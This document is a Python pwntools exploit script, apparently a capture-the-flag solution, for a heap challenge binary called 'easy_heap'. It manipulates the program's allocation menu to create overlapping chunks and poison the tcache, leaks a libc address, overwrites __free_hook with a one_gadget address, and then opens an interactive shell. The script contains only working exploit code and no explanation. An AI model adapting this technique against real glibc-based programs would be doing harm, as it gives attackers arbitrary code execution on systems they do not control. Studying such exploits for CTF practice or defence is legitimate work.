from pwn import *
f=process("./easy_heap")
libc=ELF("libc64.so")
def malloc(size=1,content=""):
	f.sendlineafter("> ","1")
	f.sendlineafter("> ",str(size))
	f.sendlineafter("> ",content)
def free(index):
	f.sendlineafter("> ","2")
	f.sendlineafter("> ",str(index))
def puts(index):
	f.sendlineafter("> ","3")
	f.sendlineafter("> ",str(index))
for i in range(10):
	malloc()
a=(9,8,7,6,5,3,1,0,2,4)
for i in range(10):
	free(a[i])
for i in range(7):
	malloc()
malloc(0)
malloc(0xf8)
b=(0,2,3,4,5,6)

for i in range(6):
	free(b[i])
free(1)
puts(8)
f.recvuntil("> ")
malloc_hook=u64(f.recv(6).ljust(8,'\0'))-96-0x10
free_hook=malloc_hook+libc.symbols['__free_hook']-libc.symbols['__malloc_hook']
log.info("malloc hook: "+hex(malloc_hook))
one_gadget=malloc_hook+0x4f322-libc.symbols['__malloc_hook']
for i in range(8):
	malloc()
free(8)
free(9)
malloc(0x10,p64(free_hook))
for i in range(7):
	free(i)
for i in range(7):
	malloc()
log.info("one_gadget:"+hex(one_gadget))
malloc(0x10,p64(one_gadget))
free(0)
f.recv()
f.interactive()


